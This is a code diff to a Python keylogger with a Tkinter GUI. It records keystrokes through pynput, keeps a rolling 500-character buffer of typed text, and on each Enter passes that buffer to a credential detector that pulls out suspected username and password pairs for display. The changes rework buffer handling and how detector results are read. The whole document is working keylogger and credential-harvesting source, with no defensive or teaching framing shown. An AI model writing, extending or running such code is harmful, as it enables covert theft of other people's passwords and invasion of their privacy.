@@ -267,16 +267,17 @@ class KeyloggerGUI:
         """Process a keyboard event and refresh the GUI elements."""
         formatted_key, is_backspace, is_return = self.format_pynput_key(key)
 
-        # Handle updating the internal log text buffer
         if is_backspace:
             self.captured_text = self.captured_text[:-1]
         elif is_return:
+            self.captured_text += " "
             self.update_suspected_logins()
-            self.captured_text = ""  # Reset buffer after pressing enter
         elif hasattr(key, 'char') and key.char is not None:
             self.captured_text += key.char
 
-        # Insert formatted text into tree view
+        if len(self.captured_text) > 500:
+            self.captured_text = self.captured_text[-500:]
+
         self.keystroke_tree.insert("", tk.END, values=(formatted_key,))
         self.keystroke_tree.yview_moveto(1)
         
@@ -298,15 +299,15 @@ class KeyloggerGUI:
         elif key == keyboard.Key.space:
             return "Space", False, False
             
-        # Clean up general functional system keys for clear logs (e.g., 'Key.shift' becomes 'shift')
         return str(key).replace("Key.", ""), False, False
 
     def update_suspected_logins(self):
         """Send internal logs into the detector module and update credentials display."""
-        
         results = self.credential_detector.find_logins(self.captured_text)
         if results:
-            for username, password in results:
+            for candidate in results:
+                username = candidate.username
+                password = candidate.password
                 login_pair = (username, password)
                 if login_pair not in self.detected_logins:
                     self.detected_logins.add(login_pair)
@@ -331,8 +332,8 @@ class KeyloggerGUI:
         self.login_count_label.config(text="Suspected logins: 0")
         self.capture_entry.delete(0, tk.END)
 
-    def close_application(self):    
-        """Close the application window and stop background hooks cleanly."""
+    def close_application(self):
+        """Close the application window."""
         self.stop_logging()
         self.root.destroy()
 
@@ -343,7 +344,4 @@ def main():
     KeyloggerGUI(root)
     root.mainloop()
 
-
-if __name__ == "__main__":
-    main()
 
